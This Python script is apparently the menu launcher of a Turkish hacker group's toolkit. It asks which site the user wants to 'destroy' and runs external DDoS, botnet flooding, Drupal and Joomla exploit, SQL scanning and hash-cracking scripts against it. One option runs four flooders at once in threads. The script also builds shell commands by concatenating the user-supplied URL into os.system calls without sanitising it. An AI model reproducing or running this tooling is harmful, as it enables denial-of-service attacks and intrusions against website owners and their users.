#!/usr/bin/python3
# -*- coding: utf-8 -*-
import os
import sys
from threading import Thread
import random

renkler=["\033[96m","\033[91m","\033[92m","\033[93m","\033[94m","\033[95m"]
renk=random.choice(renkler)
def banner():
    print("""
              ╔══════════════╗      ╔═══╗
      ╔══════╗ ██████████████       ║███║  
       ██████╗       █║     █║    
     ██║     ██║    █║     █║      ║█║ ║█║   
     ██║     ██║   █║     █║       ║█║ ║█║   
     ██║     ██║  █║     ███║      ║█║ ║█║ 
       ██████ ╔╝ ╚███████████████╚═║█║ ║█║
      ╚══════╝╚═══════════╝
   ♕TheBossHackerGroup♕
    Coder: SecreTOzi
    SecreTOzi Tarafından Kodlanmıştır.
    ☾★!VARLIĞIM TÜRK VARLIĞINA ARMAĞAN OLSUN!☾★ 
    """)


banner()
while True:
    print(renk+"""
    --------------------------
    ¦ Akbar DDOS           ¦1¦                         ☾★☾★☾★☾★☾★☾★☾★☾★☾★☾★☾★☾★
    ¦ BlackHorizon DDOS    ¦2¦                         ###########################
    ¦ BotNet Akira         ¦3¦                         # Coder: SecreTOzi     ☾★ #
    ¦ BotNet Defult        ¦4¦                         # Instagram: @byyozzi  ☾★ #
    ¦ DeepFuck             ¦5¦                         ###########################
    ¦ DrupDev              ¦6¦                         ☾★☾★☾★☾★☾★☾★☾★☾★☾★☾★☾★☾★
    ¦ GetDrupal Multi Scan ¦7¦
    ¦ Hash Type            ¦8¦
    ¦ Joomla Exploit Scan  ¦9¦
    ¦ Penbox               ¦10¦
    ¦ SadBoys              ¦11¦
    ¦ Sapyhra DDOS         ¦12¦
    ¦ Song DDOS            ¦13¦
    ¦ ScanSQL              ¦14¦
    ¦ TNScan               ¦15¦
    ¦ Toplu DDOS           ¦99¦
    ¦ TOOL INFORMATION     ¦100¦
    ¦ Exit                 ¦00¦
    ¦ View producer        ¦33¦
    ---------------------------

    """)
    try:
        islem=int(input("Hangi İşlemi Yapmak İstersiniz ? "))
    except:
        print("Adam Akıllı Gir...:")



 
    url=input("Hangi Siteyi Yok Etmek  İstersiniz ...: ")
 

    def Akbar():
        lib=os.getcwd()+"/lib"
        print("Akbar Başlıyor ! ")
        os.system("cd "+lib+"&&"+"python2 Akbar.py "+url)

    def Horizon():
        lib=os.getcwd()+"/lib"
        print("BlackHorizon ! ")
        
        os.system("cd "+lib+"&&"+"python2 BlackHorizon.py "+url)
    def botnet_d3f4():
        lib=os.getcwd()+"/lib"
        print("Botnet Default ! ")
        
        os.system("cd "+lib+"&&"+"python2 botnet_d3f4lt.py "+url)
        
    def botnet_akira():
        lib=os.getcwd()+"/lib"
        print("Botnet_Akira ! ")
        
        os.system("cd "+lib+"&&"+"python2 botnet_akira.py "+url)
    def deep_fuck():
        lib=os.getcwd()+"/lib"
        print("Deep Fuck ! ")
        
        os.system("cd "+lib+"&&"+"python2 DeepFuck "+url)
    def DrupDev():
        lib=os.getcwd()+"/lib"
        print("DrupDev ! ")
        
        os.system("cd "+lib+"&&"+"python2 drupdev.py ")
    def GetDrupal():
        lib=os.getcwd()+"/lib"
        print("Get Drupal ! ")
        
        os.system("cd "+lib+"&&"+"python2 get-drupal.py ")
    def Hash():
        lib=os.getcwd()+"/lib"
        print("Hash Type ! ")
        
        os.system("cd "+lib+"&&"+"python2 hash-type.py ")  
    def Joomla():
        lib=os.getcwd()+"/lib"
        print("Joomla Exploit Scanner ! ")
        
        os.system("cd "+lib+"&&"+"python2 joom.py "+url)
    def Penbox():
        lib=os.getcwd()+"/lib"
        print("PenBox ! ")
        
        os.system("cd "+lib+"&&"+"python2 penbox.py ")
    def Sadboys():
        lib=os.getcwd()+"/lib"
        print("Sadboys ! ")
        
        os.system("cd "+lib+"&&"+"python2 Sadboys.py "+url)
    def Sapyhra():
        lib=os.getcwd()+"/lib"
        print("Saphyra ! ")
        
        os.system("cd "+lib+"&&"+"python2 Sapyhra.py "+url)
    def Song():
        lib=os.getcwd()+"/lib"
        print("Song DDOS! ")
        
        os.system("cd "+lib+"&&"+"python2 song.py "+url)
    def ScanSQL():
        lib=os.getcwd()+"/lib"
        print("Scan SQL ! ")
        
        os.system("cd "+lib+"&&"+"python2 scansql.py ")
    def TNScan():
        lib=os.getcwd()+"/lib"
        print("TNScan! ")
        
        os.system("cd "+lib+"&&"+"python2 scansql.py "+"127.0.0.1")

    
    

    def Tool():
        print("""

    --------------------------
    ¦ Akbar DDOS           DDOS ATAR!
    ¦ BlackHorizon DDOS    DDOS ATAR!                  ###########################
    ¦ BotNet Akira         DDOS ATAR!                  # Coder:SecreTOzi         #
    ¦ BotNet Default       DDOS ATAR!                  # Instagram:@byyozzi      #
    ¦ DeepFuck             DDOS ATAR!                  ###########################
    ¦ DrupDev              İçerisinde Exploit, Mass Vs Fonksiyonlar Bulunur.
    ¦ GetDrupal Multi Scan Arama Motoru Bing Google Ve Wordpress Joomla Site Bulmanıza Ve İçerisinde Bot Bingerlar Bulundurur.
    ¦ Hash Type            Hash-Ide Gibidir Hashın Türünü Bulur Md5 Vs Kırmaya Çalışır.
    ¦ Joomla Exploit Scan  Joomla Sitelere Geniş Taramalar Yapar.
    ¦ Penbox               Kendisi Başlı Başına Bir Tooldur. Say Say Bitmez Özelliği Vardır Kesin Bakın Derim.
    ¦ SadBoys              DDOS Tooludur!
    ¦ Sapyhra DDOS         DDOS Tooludur!
    ¦ Song DDOS            DDOS Tooludur!
    ¦ ScanSQL              SQL Taraması Yapar.
    ¦ TNScan               Kendisi Başlı Başına Bir Tool Say Say Bitmez Git Bak.
    ¦ Toplu DDOS           Çeşitli Araçları Kullanarak Ddos Atar Fakat Pc Yi Zorlar.
    -------------------------
    



        """)

    def Toplu():
        print("Bilgisayarınızı Zorlayabilir !!!")
        e=input("Devam Etmek İstiyor Musunuz ? e/y...:")
        if e == "e":
            
            t1=Thread(target = Akbar)
            t2=Thread(target = Horizon)
            t3=Thread(target = botnet_d3f4)
            t4=Thread(target = botnet_akira)

            t1.start()
            t2.start()
            t3.start()
            t4.start()
        else:
            print("İşlemi İptal Ettiniz .!")
            sys.exit()
    if islem==1:
        Akbar()
    elif islem==2:
        Horizon()
    elif islem==3:
        botnet_akira()
    elif islem==4:
        botnet_d3f4()
    elif islem==5:
        deep_fuck()
    elif islem==6:
        DrupDev()
    elif islem==7:
        GetDrupal()
    elif islem==8:
        Hash()
    elif islem==9:
        Joomla()
    elif islem==10:
        Penbox()
    elif islem==11:
        Sadboys()    
    elif islem==12:
        Sapyhra()
    elif islem==13:
        Song()
    elif islem==14:
        ScanSQL()
    elif islem==15:
        TNScan()
    elif islem==99:
        Toplu()
    elif islem==100:
        Tool()
    elif islem==00:
        print("Kullandığınız İçin Teşekkürler:)")
        sys.exit()
    elif islem==33:
        print("SecreTOzi Instagram byyozzi \n mail:secretozi16@gmail.com")
    else:
        print("Adam Akıllı Bişey Gir...:")
